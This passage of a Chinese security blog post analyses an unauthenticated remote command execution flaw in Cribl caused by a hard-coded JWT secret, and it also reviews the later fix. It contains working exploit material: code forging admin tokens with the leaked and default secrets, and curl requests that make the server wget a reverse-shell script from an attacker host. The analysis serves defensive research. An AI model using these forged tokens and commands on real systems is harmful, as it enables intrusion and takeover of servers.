class="keyword">var</span> d = <span class="string">"/auth"</span>;</span><br><span class="line"><span class="keyword">var</span> v = <span class="string">"Bearer "</span>;</span><br><span class="line"><span class="keyword">var</span> m = [d + <span class="string">"/"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>(<span class="params">e, t, r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.method === <span class="string">"OPTIONS"</span>) &#123;</span><br><span class="line">        r();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; m.length; n++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.path.startsWith(<span class="string">""</span> + m[n])) &#123;</span><br><span class="line">            r();</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> i = e.cookies &amp;&amp; e.cookies[h];</span><br><span class="line">    <span class="keyword">if</span> (!i) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = e.header(<span class="string">"authentication"</span>);</span><br><span class="line">        <span class="keyword">if</span> (o &amp;&amp; o.startsWith(v)) &#123;</span><br><span class="line">            i = o.substr(v.length)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        a.decode(i || <span class="string">""</span>, f);</span><br><span class="line">        r()</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        t.sendStatus(<span class="number">401</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到逻辑非常简单，只要jwt-token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret-d2hvIGxldCB0aGUgZG9ncyBvdXQ-增大了伪造的可能性降低了程序的安全性。"><a href="#可以看到逻辑非常简单，只要jwt-token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret-d2hvIGxldCB0aGUgZG9ncyBvdXQ-增大了伪造的可能性降低了程序的安全性。" class="headerlink" title="可以看到逻辑非常简单，只要jwt token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret d2hvIGxldCB0aGUgZG9ncyBvdXQ=增大了伪造的可能性降低了程序的安全性。"></a>可以看到逻辑非常简单，只要jwt token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret <code>d2hvIGxldCB0aGUgZG9ncyBvdXQ=</code>增大了伪造的可能性降低了程序的安全性。</h6><h6 id="下面我们看看这个secret"><a href="#下面我们看看这个secret" class="headerlink" title="下面我们看看这个secret:"></a>下面我们看看这个secret:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"d2hvIGxldCB0aGUgZG9ncyBvdXQ="</span> | base64 -d</span><br><span class="line">who <span class="built_in">let</span> the dogs out</span><br></pre></td></tr></table></figure>
+
+<h6 id="最后我们来看看开发者使用了那个库来生成jwt-token的搜索JWT关键字："><a href="#最后我们来看看开发者使用了那个库来生成jwt-token的搜索JWT关键字：" class="headerlink" title="最后我们来看看开发者使用了那个库来生成jwt token的搜索JWT关键字："></a>最后我们来看看开发者使用了那个库来生成jwt token的搜索JWT关键字：</h6><h6 id="在搜索的时候我们可以看到下面的关键字也是非常重要的。"><a href="#在搜索的时候我们可以看到下面的关键字也是非常重要的。" class="headerlink" title="在搜索的时候我们可以看到下面的关键字也是非常重要的。"></a>在搜索的时候我们可以看到下面的关键字也是非常重要的。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a=&#123;HS256:&quot;hmac&quot;,HS384:&quot;hmac&quot;,HS512:&quot;hmac&quot;,RS256:&quot;sign&quot;&#125;;</span><br><span class="line">o.version=&quot;0.5.1&quot;;</span><br><span class="line">throw new Error(&quot;Algorithm not supported&quot;)</span><br><span class="line">throw new Error(&quot;Token not yet active&quot;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到："><a href="#可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到：" class="headerlink" title="可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到："></a>可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到：</h6><h6 id="https-github-com-hokaccha-node-jwt-simple"><a href="#https-github-com-hokaccha-node-jwt-simple" class="headerlink" title="https://github.com/hokaccha/node-jwt-simple"></a><a href="https://github.com/hokaccha/node-jwt-simple" target="_blank" rel="noopener">https://github.com/hokaccha/node-jwt-simple</a></h6><h6 id="下面我们来验证一下："><a href="#下面我们来验证一下：" class="headerlink" title="下面我们来验证一下："></a>下面我们来验证一下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jwt-simple'</span>);</span><br><span class="line"><span class="keyword">const</span> payload = &#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"exp"</span>: <span class="number">9999999999</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">'d2hvIGxldCB0aGUgZG9ncyBvdXQ='</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encode</span></span><br><span class="line"><span class="keyword">const</span> token = jwt.encode(payload, secret);</span><br><span class="line"><span class="built_in">console</span>.log(token);</span><br><span class="line"></span><br><span class="line"><span class="comment">// decode</span></span><br><span class="line"><span class="keyword">const</span> decoded = jwt.decode(token, secret);</span><br><span class="line"><span class="built_in">console</span>.log(decoded);</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到和poc的原作者所使用的cookie是一样的："><a href="#可以看到和poc的原作者所使用的cookie是一样的：" class="headerlink" title="可以看到和poc的原作者所使用的cookie是一样的："></a>可以看到和poc的原作者所使用的cookie是一样的：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ node ./Test.js</span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk</span><br><span class="line">5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY</span><br><span class="line">&#123; username: &apos;admin&apos;, exp: 9999999999 &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><h6 id="让我们看看后续版本是如何修复的，老规矩，使用-v1-5-1-版本的-image，映射到-9001-端口："><a href="#让我们看看后续版本是如何修复的，老规矩，使用-v1-5-1-版本的-image，映射到-9001-端口：" class="headerlink" title="让我们看看后续版本是如何修复的，老规矩，使用 v1.5.1 版本的 image，映射到 9001 端口："></a>让我们看看后续版本是如何修复的，老规矩，使用 v1.5.1 版本的 image，映射到 9001 端口：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># pull docker</span><br><span class="line">docker pull cribl/cribl:1.5.1</span><br><span class="line"># run docker</span><br><span class="line">docker run -p 9001:9000 -d cribl/cribl:1.5.1</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到之前的-exp-已经不能生效了："><a href="#可以看到之前的-exp-已经不能生效了：" class="headerlink" title="可以看到之前的 exp 已经不能生效了："></a>可以看到之前的 exp 已经不能生效了：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://192.168.220.154:9001/api/v1/system/scripts&apos; \</span><br><span class="line">-H &apos;Content-Type: application/json&apos; \</span><br><span class="line">-H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&apos; \</span><br><span class="line">--data-binary &apos;&#123;&quot;id&quot;:&quot;runme&quot;,&quot;command&quot;:&quot;/usr/bin/wget&quot;,&quot;args&quot;:[&quot;http://192.168.220.157:8302/php_file/shell.js&quot;,&quot;-P&quot;,&quot;/opt&quot;],&quot;env&quot;:&#123;&#125;&#125;&apos; --compressed</span><br><span class="line"></span><br><span class="line"># output</span><br><span class="line"># Unauthorized</span><br></pre></td></tr></table></figure>
+
+<h6 id="跟进源码，查看-v1-5-1-对程序进行了何种修改："><a href="#跟进源码，查看-v1-5-1-对程序进行了何种修改：" class="headerlink" title="跟进源码，查看 v1.5.1 对程序进行了何种修改："></a>跟进源码，查看 v1.5.1 对程序进行了何种修改：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="number">4</span> * <span class="number">3600</span>;</span><br><span class="line"><span class="keyword">var</span> d = <span class="string">"cribl_auth"</span>;</span><br><span class="line"><span class="keyword">var</span> h = <span class="string">"/auth"</span>;</span><br><span class="line"><span class="keyword">var</span> m = <span class="string">"Bearer "</span>;</span><br><span class="line"><span class="keyword">var</span> v = [h + <span class="string">"/"</span>];</span><br><span class="line"><span class="keyword">var</span> g;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g) &#123;</span><br><span class="line">        g = l.getCreateCriblSecret()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">e, t, r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.method === <span class="string">"OPTIONS"</span>) &#123;</span><br><span class="line">        r();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; v.length; n++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.path.startsWith(<span class="string">""</span> + v[n])) &#123;</span><br><span class="line">            r();</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> i = e.cookies &amp;&amp; e.cookies[d];</span><br><span class="line">    <span class="keyword">if</span> (!i) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = e.header(<span class="string">"authorization"</span>);</span><br><span class="line">        <span class="keyword">if</span> (o &amp;&amp; o.startsWith(m)) &#123;</span><br><span class="line">            i = o.substr(m.length)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    y().then(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> t = a.decode(i || <span class="string">""</span>, e);</span><br><span class="line">        <span class="keyword">if</span> (!t.username) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid auth token, missing username"</span>);</span><br><span class="line">        r()</span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        t.sendStatus(<span class="number">401</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中 l.getCreateCriblSecret = w</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">w</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = c.join(process.env.CRIBL_HOME || <span class="string">""</span>, <span class="string">"local"</span>, <span class="string">"cribl"</span>, <span class="string">"auth"</span>, <span class="string">"cribl.secret"</span>);</span><br><span class="line">        b = o.callbackToPromise(l.readFile, e).catch(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> u.mkdirp(c.dirname(e)).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> t = a.randomBytes(<span class="number">256</span>).toString(<span class="string">"base64"</span>);</span><br><span class="line">                <span class="keyword">return</span> u.atomicFileWrite(e, t).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Buffer.from(e.toString(), <span class="string">"base64"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到关键的secret不再硬编码，改成了从-opt-local-cribl-auth-cribl-secret该文件中进行读取。"><a href="#可以看到关键的secret不再硬编码，改成了从-opt-local-cribl-auth-cribl-secret该文件中进行读取。" class="headerlink" title="可以看到关键的secret不再硬编码，改成了从/opt/local/cribl/auth/cribl.secret该文件中进行读取。"></a>可以看到关键的<code>secret</code>不再硬编码，改成了从<code>/opt/local/cribl/auth/cribl.secret</code>该文件中进行读取。</h6><h6 id="那么考虑到使用docker中自带的密钥，是否可以伪造-cookie？"><a href="#那么考虑到使用docker中自带的密钥，是否可以伪造-cookie？" class="headerlink" title="那么考虑到使用docker中自带的密钥，是否可以伪造 cookie？"></a>那么考虑到使用<code>docker</code>中自带的密钥，是否可以伪造 cookie？</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">'jwt-simple'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = &#123;</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"exp"</span>: <span class="number">9999999999</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encode</span></span><br><span class="line"><span class="keyword">var</span> secret = Buffer.from(<span class="string">"vCN2P8hvUL2mvY6JZ5HhkXyNJzaSVvhOhBuZF9h34K6UbrhbPnr23/shnY09hZPUpKOTDIMql1POyPOOEygj67LPyYd57hxLmMgbVQ8IcsxLF3pu+gcc0qzrgzInWpSRXL0t4hTKDhRwR94xo/1G0nZfG8uh8M7jH3Wnr80Jujnyx0fjYhq1sWTd3ESnT2c8fUtqLwyEyx2yGeXKp+pXmrIYgFtjxDemsuUVzZlrj/fTgF+IlgWS2cxxkBRpAxxVurfZVE1E3oP8VM+73QMFOMcWrT8ABqEvhFhGBC/izNR7lKF7rkDjkwftc8UY0uvDOImaC/H/GM3ab53pyDdcNQ=="</span>, <span class="string">"base64"</span>)</span><br><span class="line"><span class="keyword">var</span> token = jwt.encode(payload, secret);</span><br><span class="line"></span><br><span class="line"><span class="comment">// decode</span></span><br><span class="line"><span class="keyword">var</span> decoded = jwt.decode(token, secret);</span><br><span class="line"><span class="built_in">console</span>.log(decoded);</span><br></pre></td></tr></table></figure>
+
+<h6 id="实验成功了。。只能说如果开发者在生产环境中不换默认的-secret-最后还是会翻车，照样未授权-RCE。"><a href="#实验成功了。。只能说如果开发者在生产环境中不换默认的-secret-最后还是会翻车，照样未授权-RCE。" class="headerlink" title="实验成功了。。只能说如果开发者在生产环境中不换默认的 secret 最后还是会翻车，照样未授权 RCE。"></a>实验成功了。。只能说如果开发者在生产环境中不换默认的 secret 最后还是会翻车，照样未授权 RCE。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://192.168.220.154:9001/api/v1/system/scripts&apos; \</span><br><span class="line">-H &apos;Content-Type: application/json&apos; \</span><br><span class="line">-H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.zRHkFfc7WtMIqFtfvSd2FUyxHxW8TlnVZtn87sNMVYc&apos; \</span><br><span class="line">--data-binary &apos;&#123;&quot;id&quot;:&quot;list&quot;,&quot;command&quot;:&quot;ls&quot;,&quot;args&quot;:[&quot;-al&quot;],&quot;env&quot;:&#123;&#125;&#125;&apos; --compressed</span><br><span class="line"># output</span><br><span class="line"># &#123;&quot;count&quot;:1,&quot;items&quot;:[&#123;&quot;command&quot;:&quot;ls&quot;,&quot;args&quot;:[&quot;-al&quot;],&quot;env&quot;:&#123;&#125;,&quot;id&quot;:&quot;list&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><h6 id="事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。"><a href="#事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。" class="headerlink" title="事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。"></a>事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。</h6><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-xz-aliyun-com-t-7139-toc-3"><a href="#https-xz-aliyun-com-t-7139-toc-3" class="headerlink" title="https://xz.aliyun.com/t/7139#toc-3"></a><a href="https://xz.aliyun.com/t/7139#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7139#toc-3</a></h6><h6 id="https-jwt-io"><a href="#https-jwt-io" class="headerlink" title="https://jwt.io/"></a><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/09/HackTM-CTF-Quals-2020的部分web题复现/" rel="next" title="HackTM CTF Quals 2020的部分web题复现">
+                <i class="fa fa-chevron-left"></i> HackTM CTF Quals 2020的部分web题复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#背景"><span class="nav-number">1.0.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.0.2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#根据作者的描述，该问题在1-5-0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1-4-3的环境进行测试："><span class="nav-number">1.0.2.1.</span> <span class="nav-text">根据作者的描述，该问题在1.5.0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1.4.3的环境进行测试：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后访问-9000-端口，可以看到如下页面，使用-admin-admin-即可登录："><span class="nav-number">1.0.2.2.</span> <span class="nav-text">然后访问 9000 端口，可以看到如下页面，使用 admin/admin 即可登录：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞测试"><span class="nav-number">1.0.3.</span> <span class="nav-text">漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹-shell-的方式获得可以交互的命令行。考虑到-cribl-本身具有-nodejs-环境，因此可以考虑结合-nodejs-的反弹-shell-脚本进行攻击。"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹 shell 的方式获得可以交互的命令行。考虑到 cribl 本身具有 nodejs 环境，因此可以考虑结合 nodejs 的反弹 shell 脚本进行攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，漏洞的利用思路如下："><span class="nav-number">1.0.3.2.</span> <span class="nav-text">因此，漏洞的利用思路如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-使用-wget-或其他方式将反弹-shell-的脚本写入受影响的环境"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">1.使用 wget 或其他方式将反弹 shell 的脚本写入受影响的环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-利用-nodejs-执行该脚本，反弹-shell"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">2.利用 nodejs 执行该脚本，反弹 shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一步，先在自己的-vps-上部署-nodejs-的反弹-shell-脚本（这里需要将YOUR-REMOTE-IP-OR-FQDN-替换为具体的地址或域名）："><span class="nav-number">1.0.3.5.</span> <span class="nav-text">第一步，先在自己的 vps 上部署 nodejs 的反弹 shell 脚本（这里需要将YOUR_REMOTE_IP_OR_FQDN 替换为具体的地址或域名）：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后准备好监听6669端口"><span class="nav-number">1.0.3.6.</span> <span class="nav-text">然后准备好监听6669端口</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本："><span class="nav-number">1.0.3.7.</span> <span class="nav-text">下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#成功反弹-shell："><span class="nav-number">1.0.3.8.</span> <span class="nav-text">成功反弹 shell：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS：原作者-poc-中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的-Cookie…"><span class="nav-number">1.0.3.9.</span> <span class="nav-text">PS：原作者 poc 中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的 Cookie…</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.0.4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问http-192-168-220-154-9000-settings-scripts可以看到之前-poc-所生成的两项："><span class="nav-number">1.0.4.1.</span> <span class="nav-text">下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问http://192.168.220.154:9000/settings/scripts可以看到之前 poc 所生成的两项：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们使用授权的admin-admin账号，可以直接增加并执行命令："><span class="nav-number">1.0.4.2.</span> <span class="nav-text">如果我们使用授权的admin/admin账号，可以直接增加并执行命令：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 